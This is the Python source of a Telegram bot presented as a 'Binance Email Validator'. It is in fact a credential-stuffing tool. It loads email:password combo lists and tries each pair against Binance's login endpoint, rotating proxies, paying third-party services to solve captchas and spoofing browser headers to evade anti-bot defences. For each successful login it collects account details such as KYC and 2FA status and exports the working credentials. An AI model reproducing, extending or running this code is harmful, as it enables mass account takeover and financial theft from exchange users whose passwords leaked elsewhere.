#!/usr/bin/env python3
"""
Binance Email Validator - Telegram Bot
Advanced Telegram bot for checking Binance accounts with multi-proxy and captcha support

Features:
- Interactive Telegram interface
- All proxy types support (HTTP/HTTPS/SOCKS4/SOCKS5)
- Multiple captcha services (2Captcha/Anti-Captcha/CapMonster)
- Real-time progress updates
- Result export in multiple formats
- Advanced error handling
- Multi-user support with session management

Author: legendhkek
Version: 1.0.0
"""

import asyncio
import json
import logging
import os
import re
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum

import aiohttp
import aiofiles
from telegram import (
    Update, 
    ReplyKeyboardMarkup, 
    ReplyKeyboardRemove,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters
)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


# Conversation states
class States(Enum):
    """Conversation states for the bot"""
    MAIN_MENU = 0
    UPLOAD_COMBO = 1
    UPLOAD_PROXIES = 2
    SELECT_PROXY_TYPE = 3
    SELECT_CAPTCHA_SERVICE = 4
    ENTER_CAPTCHA_KEY = 5
    CONFIGURE_SETTINGS = 6
    START_CHECKING = 7
    VIEW_RESULTS = 8


class ProxyType(Enum):
    """Supported proxy types"""
    HTTP = "http"
    HTTPS = "https"
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"


class CaptchaService(Enum):
    """Supported captcha services"""
    NONE = "none"
    TWOCAPTCHA = "2captcha"
    ANTICAPTCHA = "anticaptcha"
    CAPMONSTER = "capmonster"


@dataclass
class CheckResult:
    """Result of a single check"""
    email: str
    password: str
    status: str
    email_verified: Optional[bool] = None
    kyc_status: Optional[str] = None
    two_fa_enabled: Optional[bool] = None
    vip_level: Optional[int] = None
    country: Optional[str] = None
    account_status: Optional[str] = None
    phone_verified: Optional[bool] = None
    registration_date: Optional[str] = None
    error_message: Optional[str] = None
    timestamp: str = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()


@dataclass
class UserSession:
    """User session data"""
    user_id: int
    combos: List[Tuple[str, str]] = None
    proxies: List[str] = None
    proxy_type: ProxyType = ProxyType.HTTP
    captcha_service: CaptchaService = CaptchaService.NONE
    captcha_api_key: str = ""
    use_advanced_evasion: bool = True
    retry_on_captcha: bool = True
    max_captcha_retries: int = 3
    max_threads: int = 10
    results: List[CheckResult] = None
    is_checking: bool = False
    progress: Dict = None

    def __post_init__(self):
        if self.combos is None:
            self.combos = []
        if self.proxies is None:
            self.proxies = []
        if self.results is None:
            self.results = []
        if self.progress is None:
            self.progress = {
                'total': 0,
                'checked': 0,
                'valid': 0,
                'invalid': 0,
                'errors': 0,
                'start_time': None
            }


class BinanceChecker:
    """Advanced Binance account checker"""
    
    BASE_URL = "https://www.binance.com"
    
    def __init__(self, session: UserSession):
        self.session = session
        self.proxy_index = 0
        
    def get_next_proxy(self) -> Optional[Dict]:
        """Get next proxy in rotation"""
        if not self.session.proxies:
            return None
        
        proxy_str = self.session.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.session.proxies)
        
        # Parse proxy string
        parts = proxy_str.split(':')
        if len(parts) >= 2:
            proxy_url = f"{self.session.proxy_type.value}://{proxy_str}"
            return {"http": proxy_url, "https": proxy_url}
        return None
    
    async def solve_captcha(self, site_key: str, page_url: str) -> Optional[str]:
        """Solve captcha using configured service"""
        if self.session.captcha_service == CaptchaService.NONE:
            return None
        
        try:
            if self.session.captcha_service == CaptchaService.TWOCAPTCHA:
                return await self._solve_2captcha(site_key, page_url)
            elif self.session.captcha_service == CaptchaService.ANTICAPTCHA:
                return await self._solve_anticaptcha(site_key, page_url)
            elif self.session.captcha_service == CaptchaService.CAPMONSTER:
                return await self._solve_capmonster(site_key, page_url)
        except Exception as e:
            logger.error(f"Captcha solving error: {e}")
        return None
    
    async def _solve_2captcha(self, site_key: str, page_url: str) -> Optional[str]:
        """Solve captcha using 2Captcha"""
        api_key = self.session.captcha_api_key
        
        async with aiohttp.ClientSession() as session:
            # Submit captcha
            submit_url = f"http://2captcha.com/in.php?key={api_key}&method=userrecaptcha&googlekey={site_key}&pageurl={page_url}&json=1"
            async with session.get(submit_url) as resp:
                data = await resp.json()
                if data.get('status') != 1:
                    return None
                captcha_id = data.get('request')
            
            # Wait and get result
            await asyncio.sleep(20)
            
            for _ in range(10):
                result_url = f"http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}&json=1"
                async with session.get(result_url) as resp:
                    data = await resp.json()
                    if data.get('status') == 1:
                        return data.get('request')
                    elif data.get('request') != 'CAPCHA_NOT_READY':
                        return None
                await asyncio.sleep(5)
        return None
    
    async def _solve_anticaptcha(self, site_key: str, page_url: str) -> Optional[str]:
        """Solve captcha using Anti-Captcha"""
        api_key = self.session.captcha_api_key
        
        async with aiohttp.ClientSession() as session:
            # Create task
            create_url = "https://api.anti-captcha.com/createTask"
            payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": site_key
                }
            }
            async with session.post(create_url, json=payload) as resp:
                data = await resp.json()
                if data.get('errorId') != 0:
                    return None
                task_id = data.get('taskId')
            
            # Wait and get result
            await asyncio.sleep(20)
            
            result_url = "https://api.anti-captcha.com/getTaskResult"
            for _ in range(10):
                payload = {"clientKey": api_key, "taskId": task_id}
                async with session.post(result_url, json=payload) as resp:
                    data = await resp.json()
                    if data.get('status') == 'ready':
                        return data.get('solution', {}).get('gRecaptchaResponse')
                await asyncio.sleep(5)
        return None
    
    async def _solve_capmonster(self, site_key: str, page_url: str) -> Optional[str]:
        """Solve captcha using CapMonster"""
        api_key = self.session.captcha_api_key
        
        async with aiohttp.ClientSession() as session:
            # Create task
            create_url = "https://api.capmonster.cloud/createTask"
            payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": site_key
                }
            }
            async with session.post(create_url, json=payload) as resp:
                data = await resp.json()
                if data.get('errorId') != 0:
                    return None
                task_id = data.get('taskId')
            
            # Wait and get result
            await asyncio.sleep(20)
            
            result_url = "https://api.capmonster.cloud/getTaskResult"
            for _ in range(10):
                payload = {"clientKey": api_key, "taskId": task_id}
                async with session.post(result_url, json=payload) as resp:
                    data = await resp.json()
                    if data.get('status') == 'ready':
                        return data.get('solution', {}).get('gRecaptchaResponse')
                await asyncio.sleep(5)
        return None
    
    async def check_account(self, email: str, password: str) -> CheckResult:
        """Check a single Binance account"""
        result = CheckResult(email=email, password=password, status="checking")
        
        try:
            proxy = self.get_next_proxy()
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # Get CSRF token
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
                
                async with session.get(f"{self.BASE_URL}/en/login", headers=headers, proxy=proxy.get('http') if proxy else None) as resp:
                    html = await resp.text()
                    csrf_match = re.search(r'"csrfToken":"([^"]+)"', html)
                    if not csrf_match:
                        result.status = "error"
                        result.error_message = "Failed to get CSRF token"
                        return result
                    csrf_token = csrf_match.group(1)
                
                # Solve captcha if needed
                captcha_response = None
                if self.session.captcha_service != CaptchaService.NONE:
                    captcha_response = await self.solve_captcha(
                        "6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S",
                        f"{self.BASE_URL}/en/login"
                    )
                
                # Login request
                await asyncio.sleep(1)  # Human-like delay
                
                login_headers = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Origin': self.BASE_URL,
                    'Referer': f'{self.BASE_URL}/en/login',
                    'csrftoken': csrf_token,
                }
                
                login_data = {
                    "email": email,
                    "password": password,
                    "csrfToken": csrf_token,
                    "clientType": "web"
                }
                
                if captcha_response:
                    login_data["recaptchaToken"] = captcha_response
                
                async with session.post(
                    f"{self.BASE_URL}/bapi/accounts/v1/public/authcenter/login",
                    json=login_data,
                    headers=login_headers,
                    proxy=proxy.get('http') if proxy else None
                ) as resp:
                    response_data = await resp.json()
                    
                    # Check response
                    if response_data.get('code') == '000000' or response_data.get('success'):
                        result.status = "valid"
                        
                        # Get account info if token present
                        auth_token = response_data.get('token')
                        if auth_token:
                            await asyncio.sleep(0.5)
                            info_headers = {
                                **login_headers,
                                'Authorization': f'Bearer {auth_token}'
                            }
                            
                            async with session.get(
                                f"{self.BASE_URL}/bapi/accounts/v1/private/account/user-base-info",
                                headers=info_headers,
                                proxy=proxy.get('http') if proxy else None
                            ) as info_resp:
                                if info_resp.status == 200:
                                    info_data = await info_resp.json()
                                    result.email_verified = info_data.get('emailVerified')
                                    result.kyc_status = info_data.get('kycStatus')
                                    result.two_fa_enabled = info_data.get('twoFactorEnabled')
                                    result.vip_level = info_data.get('vipLevel')
                                    result.country = info_data.get('country')
                                    result.account_status = info_data.get('accountStatus')
                    else:
                        result.status = "invalid"
                        result.error_message = response_data.get('msg', 'Invalid credentials')
                        
        except asyncio.TimeoutError:
            result.status = "error"
            result.error_message = "Request timeout"
        except Exception as e:
            result.status = "error"
            result.error_message = str(e)
            logger.error(f"Check error for {email}: {e}")
        
        return result


class BinanceTelegramBot:
    """Main Telegram bot class"""
    
    def __init__(self, token: str):
        self.token = token
        self.sessions: Dict[int, UserSession] = {}
        self.application = Application.builder().token(token).build()
        self._setup_handlers()
    
    def _setup_handlers(self):
        """Setup conversation handlers"""
        
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler('start', self.start_command)],
            states={
                States.MAIN_MENU.value: [
                    CallbackQueryHandler(self.handle_menu_selection)
                ],
                States.UPLOAD_COMBO.value: [
                    MessageHandler(filters.Document.ALL | filters.TEXT, self.handle_combo_upload)
                ],
                States.UPLOAD_PROXIES.value: [
                    MessageHandler(filters.Document.ALL | filters.TEXT, self.handle_proxy_upload)
                ],
                States.SELECT_PROXY_TYPE.value: [
                    CallbackQueryHandler(self.handle_proxy_type_selection)
                ],
                States.SELECT_CAPTCHA_SERVICE.value: [
                    CallbackQueryHandler(self.handle_captcha_service_selection)
                ],
                States.ENTER_CAPTCHA_KEY.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_captcha_key_input)
                ],
                States.CONFIGURE_SETTINGS.value: [
                    CallbackQueryHandler(self.handle_settings_selection)
                ],
                States.START_CHECKING.value: [
                    CallbackQueryHandler(self.handle_start_checking)
                ],
                States.VIEW_RESULTS.value: [
                    CallbackQueryHandler(self.handle_view_results)
                ],
            },
            fallbacks=[
                CommandHandler('cancel', self.cancel_command),
                CommandHandler('start', self.start_command)
            ],
        )
        
        self.application.add_handler(conv_handler)
        self.application.add_handler(CommandHandler('help', self.help_command))
        self.application.add_handler(CommandHandler('status', self.status_command))
    
    def get_session(self, user_id: int) -> UserSession:
        """Get or create user session"""
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession(user_id=user_id)
        return self.sessions[user_id]
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Start command handler"""
        user = update.effective_user
        session = self.get_session(user.id)
        
        welcome_text = (
            f"🔐 *Binance Email Validator Bot*\n\n"
            f"Welcome {user.first_name}!\n\n"
            f"This bot checks Binance accounts with:\n"
            f"✅ All proxy types (HTTP/HTTPS/SOCKS4/SOCKS5)\n"
            f"✅ Captcha solving (2Captcha/Anti-Captcha/CapMonster)\n"
            f"✅ Advanced anti-bot evasion\n"
            f"✅ Real-time progress tracking\n\n"
            f"Choose an option below to get started:"
        )
        
        keyboard = [
            [InlineKeyboardButton("📤 Upload Combos", callback_data="upload_combos")],
            [InlineKeyboardButton("🌐 Upload Proxies", callback_data="upload_proxies")],
            [InlineKeyboardButton("⚙️ Configure Settings", callback_data="configure")],
            [InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")],
            [InlineKeyboardButton("📊 View Results", callback_data="view_results")],
            [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        return States.MAIN_MENU.value
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Help command handler"""
        help_text = (
            "*📖 Binance Validator Bot - Help*\n\n"
            "*Commands:*\n"
            "/start - Start the bot and show main menu\n"
            "/status - Show current checking status\n"
            "/cancel - Cancel current operation\n"
            "/help - Show this help message\n\n"
            "*Usage Flow:*\n"
            "1️⃣ Upload combo list (email:password format)\n"
            "2️⃣ Upload proxy list (ip:port or ip:port:user:pass)\n"
            "3️⃣ Configure settings (proxy type, captcha service)\n"
            "4️⃣ Start checking\n"
            "5️⃣ View results\n\n"
            "*Supported Formats:*\n"
            "• Combos: `email:password` (one per line)\n"
            "• Proxies: `ip:port` or `ip:port:user:pass`\n\n"
            "*Captcha Services:*\n"
            "• 2Captcha (~$2.99/1000)\n"
            "• Anti-Captcha (~$2.00/1000)\n"
            "• CapMonster (~$1.00/1000)"
        )
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Status command handler"""
        user_id = update.effective_user.id
        session = self.get_session(user_id)
        
        if not session.is_checking:
            await update.message.reply_text("❌ No checking in progress.")
            return
        
        progress = session.progress
        elapsed = time.time() - progress['start_time'] if progress['start_time'] else 0
        cpm = (progress['checked'] / (elapsed / 60)) if elapsed > 0 else 0
        
        status_text = (
            f"📊 *Checking Status*\n\n"
            f"✅ Checked: {progress['checked']}/{progress['total']}\n"
            f"💚 Valid: {progress['valid']}\n"
            f"❌ Invalid: {progress['invalid']}\n"
            f"⚠️ Errors: {progress['errors']}\n"
            f"⚡ CPM: {cpm:.1f}\n"
            f"⏱️ Elapsed: {int(elapsed)}s"
        )
        
        await update.message.reply_text(status_text, parse_mode='Markdown')
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Cancel command handler"""
        user_id = update.effective_user.id
        session = self.get_session(user_id)
        session.is_checking = False
        
        await update.message.reply_text("❌ Operation cancelled.")
        return ConversationHandler.END
    
    async def handle_menu_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle main menu button clicks"""
        query = update.callback_query
        await query.answer()
        
        action = query.data
        
        if action == "upload_combos":
            await query.edit_message_text(
                "📤 *Upload Combo List*\n\n"
                "Send me your combo list as a text file or paste directly.\n"
                "Format: `email:password` (one per line)\n\n"
                "Example:\n"
                "`user1@example.com:password123`\n"
                "`user2@gmail.com:pass456`",
                parse_mode='Markdown'
            )
            return States.UPLOAD_COMBO.value
        
        elif action == "upload_proxies":
            await query.edit_message_text(
                "🌐 *Upload Proxy List*\n\n"
                "Send me your proxy list as a text file or paste directly.\n"
                "Format: `ip:port` or `ip:port:user:pass` (one per line)\n\n"
                "Example:\n"
                "`192.168.1.1:8080`\n"
                "`proxy.example.com:3128:user:pass`",
                parse_mode='Markdown'
            )
            return States.UPLOAD_PROXIES.value
        
        elif action == "configure":
            return await self.show_configuration_menu(query)
        
        elif action == "start_check":
            return await self.confirm_start_checking(query)
        
        elif action == "view_results":
            return await self.show_results(query)
        
        elif action == "help":
            await self.help_command(update, context)
            return States.MAIN_MENU.value
    
    async def handle_combo_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle combo list upload"""
        user_id = update.effective_user.id
        session = self.get_session(user_id)
        
        combos = []
        
        # Handle file upload
        if update.message.document:
            file = await update.message.document.get_file()
            content = await file.download_as_bytearray()
            text = content.decode('utf-8', errors='ignore')
        else:
            text = update.message.text
        
        # Parse combos
        for line in text.strip().split('\n'):
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    email, password = parts
                    if '@' in email:
                        combos.append((email.strip(), password.strip()))
        
        if not combos:
            await update.message.reply_text("❌ No valid combos found. Please check the format.")
            return States.UPLOAD_COMBO.value
        
        session.combos = combos
        
        await update.message.reply_text(
            f"✅ Loaded {len(combos)} combos successfully!\n\n"
            f"Use /start to return to main menu.",
            reply_markup=ReplyKeyboardRemove()
        )
        
        return await self.start_command(update, context)
    
    async def handle_proxy_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle proxy list upload"""
        user_id = update.effective_user.id
        session = self.get_session(user_id)
        
        proxies = []
        
        # Handle file upload
        if update.message.document:
            file = await update.message.document.get_file()
            content = await file.download_as_bytearray()
            text = content.decode('utf-8', errors='ignore')
        else:
            text = update.message.text
        
        # Parse proxies
        for line in text.strip().split('\n'):
            line = line.strip()
            if ':' in line and line.count(':') >= 1:
                proxies.append(line)
        
        if not proxies:
            await update.message.reply_text("❌ No valid proxies found. Please check the format.")
            return States.UPLOAD_PROXIES.value
        
        session.proxies = proxies
        
        await update.message.reply_text(
            f"✅ Loaded {len(proxies)} proxies successfully!\n\n"
            f"Use /start to return to main menu.",
            reply_markup=ReplyKeyboardRemove()
        )
        
        return await self.start_command(update, context)
    
    async def show_configuration_menu(self, query) -> int:
        """Show configuration menu"""
        user_id = query.from_user.id
        session = self.get_session(user_id)
        
        config_text = (
            f"⚙️ *Current Configuration*\n\n"
            f"🌐 Proxy Type: `{session.proxy_type.value.upper()}`\n"
            f"🔐 Captcha Service: `{session.captcha_service.value.upper()}`\n"
            f"🛡️ Advanced Evasion: `{'ON' if session.use_advanced_evasion else 'OFF'}`\n"
            f"🔄 Retry on Captcha: `{'YES' if session.retry_on_captcha else 'NO'}`\n"
            f"🔢 Max Captcha Retries: `{session.max_captcha_retries}`\n"
            f"🧵 Max Threads: `{session.max_threads}`\n\n"
            f"Select setting to change:"
        )
        
        keyboard = [
            [InlineKeyboardButton("🌐 Change Proxy Type", callback_data="set_proxy_type")],
            [InlineKeyboardButton("🔐 Change Captcha Service", callback_data="set_captcha")],
            [InlineKeyboardButton("🔑 Set Captcha API Key", callback_data="set_captcha_key")],
            [InlineKeyboardButton("🛡️ Toggle Advanced Evasion", callback_data="toggle_evasion")],
            [InlineKeyboardButton("🔄 Toggle Captcha Retry", callback_data="toggle_retry")],
            [InlineKeyboardButton("🔢 Set Max Retries", callback_data="set_max_retries")],
            [InlineKeyboardButton("🧵 Set Max Threads", callback_data="set_threads")],
            [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            config_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        return States.CONFIGURE_SETTINGS.value
    
    async def handle_settings_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle settings menu selections"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        session = self.get_session(user_id)
        action = query.data
        
        if action == "set_proxy_type":
            keyboard = [
                [InlineKeyboardButton("HTTP", callback_data="proxy_http")],
                [InlineKeyboardButton("HTTPS", callback_data="proxy_https")],
                [InlineKeyboardButton("SOCKS4", callback_data="proxy_socks4")],
                [InlineKeyboardButton("SOCKS5", callback_data="proxy_socks5")],
                [InlineKeyboardButton("◀️ Back", callback_data="back_config")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "🌐 *Select Proxy Type*",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            return States.SELECT_PROXY_TYPE.value
        
        elif action == "set_captcha":
            keyboard = [
                [InlineKeyboardButton("NONE (No Captcha)", callback_data="captcha_none")],
                [InlineKeyboardButton("2Captcha", callback_data="captcha_2captcha")],
                [InlineKeyboardButton("Anti-Captcha", callback_data="captcha_anticaptcha")],
                [InlineKeyboardButton("CapMonster", callback_data="captcha_capmonster")],
                [InlineKeyboardButton("◀️ Back", callback_data="back_config")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "🔐 *Select Captcha Service*",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            return States.SELECT_CAPTCHA_SERVICE.value
        
        elif action == "set_captcha_key":
            await query.edit_message_text(
                "🔑 *Enter Captcha API Key*\n\n"
                "Send me your captcha service API key:",
                parse_mode='Markdown'
            )
            return States.ENTER_CAPTCHA_KEY.value
        
        elif action == "toggle_evasion":
            session.use_advanced_evasion = not session.use_advanced_evasion
            await query.answer(f"Advanced evasion: {'ON' if session.use_advanced_evasion else 'OFF'}")
            return await self.show_configuration_menu(query)
        
        elif action == "toggle_retry":
            session.retry_on_captcha = not session.retry_on_captcha
            await query.answer(f"Captcha retry: {'ON' if session.retry_on_captcha else 'OFF'}")
            return await self.show_configuration_menu(query)
        
        elif action == "back_config":
            return await self.show_configuration_menu(query)
        
        elif action == "back_menu":
            return await self.start_command(update, context)
    
    async def handle_proxy_type_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle proxy type selection"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        session = self.get_session(user_id)
        
        action = query.data
        
        if action.startswith("proxy_"):
            proxy_type = action.replace("proxy_", "")
            session.proxy_type = ProxyType(proxy_type)
            await query.answer(f"Proxy type set to: {proxy_type.upper()}")
        
        return await self.show_configuration_menu(query)
    
    async def handle_captcha_service_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle captcha service selection"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        session = self.get_session(user_id)
        
        action = query.data
        
        if action.startswith("captcha_"):
            service = action.replace("captcha_", "")
            session.captcha_service = CaptchaService(service)
            await query.answer(f"Captcha service set to: {service.upper()}")
        
        return await self.show_configuration_menu(query)
    
    async def handle_captcha_key_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle captcha API key input"""
        user_id = update.effective_user.id
        session = self.get_session(user_id)
        
        api_key = update.message.text.strip()
        session.captcha_api_key = api_key
        
        await update.message.reply_text(
            f"✅ Captcha API key saved!\n\n"
            f"Use /start to return to main menu."
        )
        
        return await self.start_command(update, context)
    
    async def confirm_start_checking(self, query) -> int:
        """Confirm before starting check"""
        user_id = query.from_user.id
        session = self.get_session(user_id)
        
        if not session.combos:
            await query.answer("❌ No combos loaded!", show_alert=True)
            return States.MAIN_MENU.value
        
        if not session.proxies:
            await query.answer("⚠️ Warning: No proxies loaded!", show_alert=True)
        
        confirm_text = (
            f"🚀 *Ready to Start*\n\n"
            f"📊 Combos: {len(session.combos)}\n"
            f"🌐 Proxies: {len(session.proxies)}\n"
            f"🔧 Proxy Type: {session.proxy_type.value.upper()}\n"
            f"🔐 Captcha: {session.captcha_service.value.upper()}\n"
            f"🧵 Threads: {session.max_threads}\n\n"
            f"Start checking?"
        )
        
        keyboard = [
            [InlineKeyboardButton("✅ Start Now", callback_data="confirm_start")],
            [InlineKeyboardButton("❌ Cancel", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            confirm_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        return States.START_CHECKING.value
    
    async def handle_start_checking(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle start checking confirmation"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "back_menu":
            return await self.start_command(update, context)
        
        user_id = query.from_user.id
        session = self.get_session(user_id)
        
        if session.is_checking:
            await query.answer("⚠️ Already checking!", show_alert=True)
            return States.MAIN_MENU.value
        
        await query.edit_message_text(
            "🚀 *Starting checks...*\n\n"
            "This may take a while. Use /status to check progress.",
            parse_mode='Markdown'
        )
        
        # Start checking in background
        asyncio.create_task(self.run_checks(user_id, query.message.chat_id))
        
        return States.MAIN_MENU.value
    
    async def run_checks(self, user_id: int, chat_id: int):
        """Run account checks"""
        session = self.get_session(user_id)
        session.is_checking = True
        session.results = []
        session.progress = {
            'total': len(session.combos),
            'checked': 0,
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'start_time': time.time()
        }
        
        checker = BinanceChecker(session)
        
        # Create semaphore for thread limiting
        semaphore = asyncio.Semaphore(session.max_threads)
        
        async def check_with_semaphore(email, password):
            async with semaphore:
                result = await checker.check_account(email, password)
                session.results.append(result)
                session.progress['checked'] += 1
                
                if result.status == "valid":
                    session.progress['valid'] += 1
                elif result.status == "invalid":
                    session.progress['invalid'] += 1
                else:
                    session.progress['errors'] += 1
                
                # Send progress updates every 10 checks
                if session.progress['checked'] % 10 == 0:
                    await self.send_progress_update(chat_id, session)
                
                return result
        
        # Run all checks
        tasks = [check_with_semaphore(email, password) for email, password in session.combos]
        await asyncio.gather(*tasks)
        
        session.is_checking = False
        
        # Send final results
        await self.send_final_results(chat_id, session)
    
    async def send_progress_update(self, chat_id: int, session: UserSession):
        """Send progress update"""
        progress = session.progress
        elapsed = time.time() - progress['start_time']
        cpm = (progress['checked'] / (elapsed / 60)) if elapsed > 0 else 0
        
        progress_text = (
            f"📊 *Progress Update*\n\n"
            f"✅ Checked: {progress['checked']}/{progress['total']}\n"
            f"💚 Valid: {progress['valid']}\n"
            f"❌ Invalid: {progress['invalid']}\n"
            f"⚠️ Errors: {progress['errors']}\n"
            f"⚡ CPM: {cpm:.1f}"
        )
        
        try:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=progress_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Error sending progress: {e}")
    
    async def send_final_results(self, chat_id: int, session: UserSession):
        """Send final results"""
        progress = session.progress
        elapsed = time.time() - progress['start_time']
        
        results_text = (
            f"✅ *Checking Complete!*\n\n"
            f"📊 Total: {progress['total']}\n"
            f"💚 Valid: {progress['valid']}\n"
            f"❌ Invalid: {progress['invalid']}\n"
            f"⚠️ Errors: {progress['errors']}\n"
            f"⏱️ Time: {int(elapsed)}s\n\n"
            f"Use /start to view detailed results or start a new check."
        )
        
        try:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=results_text,
                parse_mode='Markdown'
            )
            
            # Export results to file
            if session.results:
                await self.export_results(chat_id, session)
        except Exception as e:
            logger.error(f"Error sending final results: {e}")
    
    async def export_results(self, chat_id: int, session: UserSession):
        """Export results to file"""
        # Create results file
        filename = f"binance_results_{session.user_id}_{int(time.time())}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*60 + "\n")
            f.write("BINANCE EMAIL VALIDATOR - RESULTS\n")
            f.write("="*60 + "\n\n")
            
            valid_results = [r for r in session.results if r.status == "valid"]
            
            if valid_results:
                f.write(f"VALID ACCOUNTS ({len(valid_results)})\n")
                f.write("-"*60 + "\n")
                for result in valid_results:
                    f.write(f"\nEmail: {result.email}\n")
                    f.write(f"Password: {result.password}\n")
                    if result.email_verified is not None:
                        f.write(f"Email Verified: {result.email_verified}\n")
                    if result.kyc_status:
                        f.write(f"KYC Status: {result.kyc_status}\n")
                    if result.two_fa_enabled is not None:
                        f.write(f"2FA Enabled: {result.two_fa_enabled}\n")
                    if result.vip_level is not None:
                        f.write(f"VIP Level: {result.vip_level}\n")
                    if result.country:
                        f.write(f"Country: {result.country}\n")
                    if result.account_status:
                        f.write(f"Status: {result.account_status}\n")
                    f.write("-"*60 + "\n")
            
            f.write(f"\n\nSUMMARY\n")
            f.write("-"*60 + "\n")
            f.write(f"Total Checked: {session.progress['total']}\n")
            f.write(f"Valid: {session.progress['valid']}\n")
            f.write(f"Invalid: {session.progress['invalid']}\n")
            f.write(f"Errors: {session.progress['errors']}\n")
        
        # Send file
        try:
            await self.application.bot.send_document(
                chat_id=chat_id,
                document=open(filename, 'rb'),
                caption="📊 Results exported"
            )
            os.remove(filename)
        except Exception as e:
            logger.error(f"Error sending results file: {e}")
    
    async def show_results(self, query) -> int:
        """Show results"""
        user_id = query.from_user.id
        session = self.get_session(user_id)
        
        if not session.results:
            await query.answer("No results available yet!", show_alert=True)
            return States.MAIN_MENU.value
        
        valid_count = len([r for r in session.results if r.status == "valid"])
        invalid_count = len([r for r in session.results if r.status == "invalid"])
        error_count = len([r for r in session.results if r.status == "error"])
        
        results_text = (
            f"📊 *Results Summary*\n\n"
            f"Total: {len(session.results)}\n"
            f"💚 Valid: {valid_count}\n"
            f"❌ Invalid: {invalid_count}\n"
            f"⚠️ Errors: {error_count}\n\n"
        )
        
        # Show sample of valid accounts
        valid_results = [r for r in session.results if r.status == "valid"][:5]
        if valid_results:
            results_text += "*Sample Valid Accounts:*\n"
            for result in valid_results:
                results_text += f"\n`{result.email}`\n"
                if result.email_verified:
                    results_text += f"✅ Email Verified\n"
                if result.kyc_status:
                    results_text += f"🆔 KYC: {result.kyc_status}\n"
        
        keyboard = [
            [InlineKeyboardButton("📥 Export Full Results", callback_data="export_results")],
            [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            results_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        return States.VIEW_RESULTS.value
    
    async def handle_view_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle view results actions"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "export_results":
            user_id = query.from_user.id
            session = self.get_session(user_id)
            await self.export_results(query.message.chat_id, session)
            await query.answer("✅ Results exported!")
        
        elif query.data == "back_menu":
            return await self.start_command(update, context)
        
        return States.MAIN_MENU.value
    
    def run(self):
        """Run the bot"""
        logger.info("Starting Binance Telegram Bot...")
